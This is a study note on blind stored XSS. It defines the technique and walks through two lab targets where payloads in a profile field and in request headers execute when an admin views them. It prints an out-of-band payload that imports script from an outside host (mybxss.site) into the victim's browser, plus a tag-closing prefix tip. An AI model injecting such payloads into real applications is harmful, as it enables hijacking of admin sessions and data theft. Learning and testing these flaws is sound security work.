# Blind XSS

* **What it is:** Blind XSS is a stored XSS where the attacker’s payload is saved by the app but **not** immediately reflected back to the attacker. Instead it executes later in another context (admin panel, email viewer, log viewer, etc.), so the attacker sees no immediate browser pop-up — hence “blind.”
* **Typical flow:** Attacker injects payload → payload is stored (DB, logs, ticket system, file metadata) → a different user or backend process opens the stored data → payload executes in that victim’s browser/context → attacker receives out-of-band evidence (callback/DNS/HTTP).
* **Common sinks:** admin dashboards, support/CRM systems, email previews, log viewers, scheduled reports, file previewers, notification systems.
* **Why it’s dangerous:** Execution happens in a higher-privilege context (admins), can steal session tokens, perform actions, pivot, or exfiltrate data via OOB channels — often unnoticed for longer.
* **How defenders detect it:** instrument out-of-band (OOB) testing using safe collaborator services (DNS/HTTP callbacks), monitor server logs for unexpected script activity, add alerting on suspicious HTML in stored fields, and review rendered outputs in admin UIs.

{% hint style="info" %}
_Even though it seems that the payload is percent encoded in the source code it might execute XSS somewhere else like in the admin panel etc._&#x20;
{% endhint %}

## Target - 1&#x20;

<figure><img src="../../../.gitbook/assets/image (224).png" alt=""><figcaption></figcaption></figure>

We can see that no users is created yet. let's create a user.&#x20;

<figure><img src="../../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>

We can see that user in the user list and we're directly logged in as that user. Let's check the profile section.&#x20;

<figure><img src="../../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (227).png" alt=""><figcaption></figcaption></figure>

We can see that we're given the option to edit our information in the profile tab. let's try to enter some payload if we can find stored XSS therein.&#x20;

### Checking for reflections

<figure><img src="../../../.gitbook/assets/image (228).png" alt=""><figcaption></figcaption></figure>

We can see that when we try to update the profile it is reflecting back in the same textarea field. Also we know that there is no way to execute any other tag inside textarea. So for executing XSS we need to break out of the textarea.&#x20;

<figure><img src="../../../.gitbook/assets/image (229).png" alt=""><figcaption></figcaption></figure>

But still there is no any change. Let's see the source code for what hapenned.&#x20;

<figure><img src="../../../.gitbook/assets/image (230).png" alt=""><figcaption></figcaption></figure>

We can see that the payload is URL encoded. Let's now see that user from the admin panel with the admin credentials provided to us. We can see that user list there too.&#x20;

<figure><img src="../../../.gitbook/assets/image (231).png" alt=""><figcaption></figcaption></figure>

And boom on clicking on that user we strike an XSS therein.&#x20;

<figure><img src="../../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>

Thus we can't determine where the internal reflection may be possible. So we continuously need to check the payloads and if it is reflecting somewhere else that we couldn't determine. Same case of `aree` industries where I have found a stored XSS in which payload was entered while registration but later it reflected when someone else tried to view our profile.&#x20;

{% hint style="info" %}
_Note the `"/>` used in the payload context. Make sure to use this before starting any payload because what it does is it tries to close any other tag that is yet open._&#x20;
{% endhint %}

## Target - 2

<figure><img src="../../../.gitbook/assets/image (234).png" alt=""><figcaption></figcaption></figure>

On clicking on placing order it is simply replying with a message that your order has been placed and not a single input of that is being reflected back. So can we find XSS herein. let's check in the admin panel what new things we did get.&#x20;

<figure><img src="../../../.gitbook/assets/image (235).png" alt=""><figcaption></figcaption></figure>

Thus we can see that the admin is able to see various orders placed by the customers and the address of the customer. As well as it seems that the website is trying to fingerprint the customer for some tracking details. Let's try to use burp suite match and replace to modify all these and let's check if we can execute XSS therein.&#x20;

But note that the developer here corrected the mistake that he did in the target-1 thus we're unable to execute XSS from the `Customer Address` field. But he forgot to encode/sanitize the Request headers that is stored and reflected in the admin panel that they had done for the fingerprinting. let's take advantage of it.&#x20;

<figure><img src="../../../.gitbook/assets/image (236).png" alt=""><figcaption></figcaption></figure>

Place the order again so that the malicious header will go in the admin panel. And boom. :bomb:

<figure><img src="../../../.gitbook/assets/image (237).png" alt=""><figcaption></figcaption></figure>

But let's say we're unable to access the admin panel then how to determine/find this vulnerability. So the answer is simple. instead of attaching an XSS payload attach this and log requests on your server:&#x20;

**`<svg/onload=import('//mybxss.site')>`**

{% hint style="info" %}
_Note that this alerts didn't come immediately. Sometimes it takes days/weeks/months to execute because we don't know when the admin might open things or whether he will open or not. But this is the simplest and best method to demonstrate blind XSS vulnerability._&#x20;
{% endhint %}
